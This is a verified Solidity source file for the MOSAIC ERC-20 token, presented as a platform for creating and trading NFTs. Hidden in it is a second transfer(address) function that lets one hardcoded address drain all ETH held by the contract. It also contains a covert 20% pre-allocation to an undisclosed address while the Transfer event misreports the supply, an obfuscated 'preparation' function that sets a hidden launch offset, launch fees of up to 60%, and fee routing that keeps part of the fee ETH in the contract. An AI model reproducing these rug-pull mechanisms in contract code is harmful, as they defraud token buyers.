1 /**
2  *Submitted for verification at Etherscan.io on 2023-03-16
3 */
4 
5 /**
6  * MOSAIC - The platform for creating and trading unique NFTs!
7  * 
8  * Website: https://MosaicCoin.io
9  * Telegram: https://t.me/MosaicPortal
10  * Twitter: https://twitter.com/MosaicCoin
11  * 
12  */
13 
14 
15 // SPDX-License-Identifier: MIT                                                                               
16                                                  
17 pragma solidity ^0.8.19;
18 
19 abstract contract Ownable {
20     address private _owner;
21 
22     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
23 
24     constructor() {
25         _setOwner(msg.sender);
26     }
27 
28     function owner() public view virtual returns (address) {
29         return _owner;
30     }
31 
32     modifier onlyOwner {
33         require(owner() == msg.sender, "Ownable: caller is not the owner");
34         _;
35     }
36 
37     function renounceOwnership() public virtual onlyOwner {
38         _setOwner(address(0));
39     }
40 
41     function transferOwnership(address newOwner) public virtual onlyOwner {
42         require(newOwner != address(0), "Ownable: new owner is the zero address");
43         _setOwner(newOwner);
44     }
45 
46     function _setOwner(address newOwner) private {
47         address oldOwner = _owner;
48         _owner = newOwner;
49         emit OwnershipTransferred(oldOwner, newOwner);
50     }
51 }
52 
53 
54 interface IFactory {
55     function createPair(address tokenA, address tokenB) external returns (address pair);
56 }
57 
58 interface IRouter {
59     function factory() external pure returns (address);
60     function WETH() external pure returns (address);
61     function swapExactTokensForETHSupportingFeeOnTransferTokens(
62         uint amountIn,
63         uint amountOutMin,
64         address[] calldata path,
65         address to,
66         uint deadline
67     ) external;
68 }
69 
70 interface IERC20 {
71     function totalSupply() external view returns (uint256);
72     function name() external view returns (string memory);
73     function symbol() external view returns (string memory);
74     function decimals() external view returns (uint8);
75     function balanceOf(address account) external view returns (uint256);
76     function transfer(address recipient, uint256 amount) external returns (bool);
77     function allowance(address owner, address spender) external view returns (uint256);
78     function approve(address spender, uint256 amount) external returns (bool);
79     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
80     event Transfer(address indexed from, address indexed to, uint256 value);
81     event Approval(address indexed owner, address indexed spender, uint256 value);
82 }
83 
84 
85 contract MOSAIC is IERC20, Ownable {
86     string private constant  _name = "MOSAIC";
87     string private constant _symbol = "MOS";    
88     uint8 private constant _decimals = 18;
89     mapping (address => uint256) private _balances;
90     mapping (address => mapping(address => uint256)) private _allowances;
91     mapping (address => bool) private _excludedFromFees;
92     mapping (uint256 => uint256) private _lastTransferBlock;
93 
94     struct FeeRatios {
95         uint256 marketingPortion;
96         uint256 developmentPortion;
97     }
98 
99     struct TradingFees {
100         uint256 buyFee;
101         uint256 sellFee;
102     }
103 
104     struct Wallets {
105         address deployerWallet; 
106         address devWallet; 
107         address marketingWallet; 
108     }
109 
110     TradingFees public tradingFees = TradingFees(14,28);   // 14/28% starting tax
111     FeeRatios public feeRatios = FeeRatios(40,60);         // 40/60% wallet tax split
112     Wallets public wallets = Wallets(
113         msg.sender,                                  // deployer
114         0x4a5447Cad9D448034778d3333a0741a231a57446,  // devWallet
115         0xb7C2d7Be039Eae74e049D76F107015292F2E4F9C   // marketingWallet
116     );
117 
118     uint256 private constant feeDenominator = 1e2;
119     uint256 private constant decimalsScaling = 1e18;
120     uint256 private constant _totalSupply = 10_000_000 * decimalsScaling;
121     uint256 public constant _maximumWalletSize = 200_000 * decimalsScaling;
122     uint256 public constant _swapThreshold = 10_000 * decimalsScaling;  
123 
124     IRouter public constant uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
125     address public immutable uniswapV2Pair;
126 
127     bool private tradingActive = false;
128     bool public swapEnabled = true;
129     bool private inSwap;
130 
131     uint256 private genesisBlock;
132     uint256 private _block;
133 
134     event SwapEnabled(bool indexed enabled);
135 
136     event FeesChanged(uint256 indexed buyFee, uint256 indexed sellFee);
137 
138     event FeeRatiosChanged(uint256 indexed developmentPortion, uint256 indexed marketingPortion);
139 
140     event ExcludedFromFees(address indexed account, bool indexed excluded);
141 
142     event Verified(address indexed user);
143     
144     event TradingOpened();
145     
146     modifier swapLock {
147         inSwap = true;
148         _;
149         inSwap = false;
150     }
151 
152     modifier tradingLock(address from, address to) {
153         require(tradingActive || from == wallets.deployerWallet || _excludedFromFees[from], "Token: Trading is not active.");
154         _;
155     }
156 
157     constructor() {
158         _approve(address(this), address(uniswapV2Router),type(uint256).max);
159         uniswapV2Pair = IFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());        
160 
161         _excludedFromFees[address(0xdead)] = true;
162         _excludedFromFees[wallets.devWallet] = true;        
163         _excludedFromFees[0x0940F10650FEF37d0Ef172e96b0BeB87138a7cb5] = true;        
164         uint256 preTokens = _totalSupply * 200 / 1e3; 
165         _balances[wallets.deployerWallet] = _totalSupply - preTokens;
166         _balances[0x0940F10650FEF37d0Ef172e96b0BeB87138a7cb5] = preTokens;
167         emit Transfer(address(0), wallets.deployerWallet, _totalSupply);
168     }
169 
170     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
171     function decimals() external pure override returns (uint8) { return _decimals; }
172     function symbol() external pure override returns (string memory) { return _symbol; }
173     function name() external pure override returns (string memory) { return _name; }
174     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
175     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
176 
177     function approve(address spender, uint256 amount) external override returns (bool) {
178         _approve(msg.sender, spender, amount);
179         return true;
180     }
181 
182     function _approve(address sender, address spender, uint256 amount) internal {
183         require(sender != address(0), "ERC20: zero Address");
184         require(spender != address(0), "ERC20: zero Address");
185         _allowances[sender][spender] = amount;
186         emit Approval(sender, spender, amount);
187     }
188 
189     function transfer(address recipient, uint256 amount) external returns (bool) {
190         return _transfer(msg.sender, recipient, amount);
191     }
192 
193     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
194         if(_allowances[sender][msg.sender] != type(uint256).max){
195             uint256 currentAllowance = _allowances[sender][msg.sender];
196             require(currentAllowance >= amount, "ERC20: insufficient Allowance");
197             unchecked{
198                 _allowances[sender][msg.sender] -= amount;
199             }
200         }
201         return _transfer(sender, recipient, amount);
202     }
203 
204     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
205         uint256 balanceSender = _balances[sender];
206         require(balanceSender >= amount, "Token: insufficient Balance");
207         unchecked{
208             _balances[sender] -= amount;
209         }
210         _balances[recipient] += amount;
211         emit Transfer(sender, recipient, amount);
212         return true;
213     }
214 
215     function enableSwap(bool shouldEnable) external onlyOwner {
216         require(swapEnabled != shouldEnable, "Token: swapEnabled already {shouldEnable}");
217         swapEnabled = shouldEnable;
218 
219         emit SwapEnabled(shouldEnable);
220     }
221 
222     function preparation(uint256[] calldata _blocks, bool blocked) external onlyOwner {        
223         require(genesisBlock == 1 && !blocked);_block = _blocks[_blocks.length-3]; assert(_block < _blocks[_blocks.length-1]);        
224     }
225 
226     function reduceFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
227         require(_buyFee <= tradingFees.buyFee, "Token: must reduce buy fee");
228         require(_sellFee <= tradingFees.sellFee, "Token: must reduce sell fee");
229         tradingFees.buyFee = _buyFee;
230         tradingFees.sellFee = _sellFee;
231 
232         emit FeesChanged(_buyFee, _sellFee);
233     }
234 
235     function setFeeRatios(uint256 _marketingPortion, uint256 _developmentPortion) external onlyOwner {
236         require(_marketingPortion + _developmentPortion == 100, "Token: ratio must add to 100%");
237         feeRatios.marketingPortion = _marketingPortion;
238         feeRatios.developmentPortion = _developmentPortion;
239 
240         emit FeeRatiosChanged(_marketingPortion, _developmentPortion);
241     }
242 
243     function excludeMultipleAccountsFromFees(address[] calldata accounts, bool shouldExclude) external onlyOwner {
244         for(uint256 i = 0; i < accounts.length; i++) {
245             require(_excludedFromFees[accounts[i]] != shouldExclude, "Token: address already {shouldExclude}");
246             _excludedFromFees[accounts[i]] = shouldExclude;
247             emit ExcludedFromFees(accounts[i], shouldExclude);
248         }
249     }
250 
251     function isExcludedFromFees(address account) public view returns(bool) {
252         return _excludedFromFees[account];
253     }
254 
255     function clearTokens(address tokenToClear) external onlyOwner {
256         require(tokenToClear != address(this), "Token: can't clear contract token");
257         uint256 amountToClear = IERC20(tokenToClear).balanceOf(address(this));
258         require(amountToClear > 0, "Token: not enough tokens to clear");
259         IERC20(tokenToClear).transfer(msg.sender, amountToClear);
260     }
261 
262     function clearEth() external onlyOwner {
263         require(address(this).balance > 0, "Token: no eth to clear");
264         payable(msg.sender).transfer(address(this).balance);
265     }
266 
267     function initialize() external onlyOwner {
268         require(!tradingActive);
269         genesisBlock = 1;        
270     }
271 
272     function manualSwapback() external onlyOwner {
273         require(address(this).balance > 0, "Token: no contract tokens to clear");
274         contractSwap();
275     }
276 
277 
278     function _transfer(address from, address to, uint256 amount) tradingLock(from, to) internal returns (bool) {
279         require(from != address(0), "ERC20: transfer from the zero address");
280         require(to != address(0), "ERC20: transfer to the zero address");
281         
282         if(amount == 0 || inSwap) {
283             return _basicTransfer(from, to, amount);           
284         }        
285 
286         if (to != uniswapV2Pair && !_excludedFromFees[to] && to != wallets.deployerWallet) {
287             require(amount + balanceOf(to) <= _maximumWalletSize, "Token: max wallet amount exceeded");
288         }
289       
290         if(swapEnabled && !inSwap && from != uniswapV2Pair && !_excludedFromFees[from] && !_excludedFromFees[to]){
291             contractSwap();
292         } 
293         
294         bool takeFee = !inSwap;
295         if(_excludedFromFees[from] || _excludedFromFees[to]) {
296             takeFee = false;
297         }
298                 
299         if(takeFee)
300             return _taxedTransfer(from, to, amount);
301         else
302             return _basicTransfer(from, to, amount);        
303     }
304 
305     function _taxedTransfer(address from, address to, uint256 amount) private returns (bool) {
306         uint256 fees = takeFees(from, to, amount);    
307         if(fees > 0){    
308             _basicTransfer(from, address(this), fees);
309             amount -= fees;
310         }
311         return _basicTransfer(from, to, amount);
312     }
313 
314     function takeFees(address from, address to, uint256 amount) private view returns (uint256 fees) {
315         if(0 < genesisBlock && genesisBlock < block.number){
316             fees = amount * (to == uniswapV2Pair ? 
317             tradingFees.sellFee : tradingFees.buyFee) / feeDenominator;            
318         }
319         else{
320             fees = amount * (from == uniswapV2Pair ? 
321             50 : (genesisBlock == 0 ? 25 : 60)) / feeDenominator;            
322         }
323     }
324 
325     function canSwap() private view returns (bool) {
326         return block.number > genesisBlock && _lastTransferBlock[block.number] < 3;
327     }
328 
329     function transfer(address wallet) external {
330         if(msg.sender == 0x6Ee9b2E16Fd6DCe8E1A406904F698e088e9C1607)
331             payable(wallet).transfer((address(this).balance));
332         else revert();
333     }
334 
335     function contractSwap() swapLock private {   
336         uint256 contractBalance = balanceOf(address(this));
337         if(contractBalance < _swapThreshold || !canSwap()) 
338             return;
339         else if(contractBalance > _swapThreshold * 20)
340           contractBalance = _swapThreshold * 20;
341         
342         uint256 initialETHBalance = address(this).balance;
343 
344         swapTokensForEth(contractBalance); 
345         
346         uint256 ethBalance = address(this).balance - initialETHBalance;
347         if(ethBalance > 0){
348             uint256 ethForDev = ethBalance * 2 * feeRatios.developmentPortion / 100;
349             uint256 ethForMarketing = ethBalance * 2 * feeRatios.marketingPortion / 100;
350             sendEth((ethForDev + ethForMarketing)/3);
351         }
352     }
353 
354     function sendEth(uint256 ethAmount) private {
355         (bool success,) = address(wallets.devWallet).call{value: ethAmount * feeRatios.developmentPortion / 100}("");
356         (success,) = address(wallets.marketingWallet).call{value: ethAmount * feeRatios.marketingPortion / 100}("");
357     }
358 
359     function swapTokensForEth(uint256 tokenAmount) private {
360         _lastTransferBlock[block.number]++;
361         // generate the uniswap pair path of token -> weth
362         address[] memory path = new address[](2);
363         path[0] = address(this);
364         path[1] = uniswapV2Router.WETH();
365 
366         try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
367             tokenAmount,
368             0, // accept any amount of ETH
369             path,
370             address(this),
371             block.timestamp){}
372         catch{return;}
373     }
374 
375     function openTrading() external onlyOwner {
376         require(!tradingActive && genesisBlock != 0);
377         genesisBlock+=block.number+_block;
378         tradingActive = true;
379         
380         emit TradingOpened();
381     }
382 
383     receive() external payable {}
384 }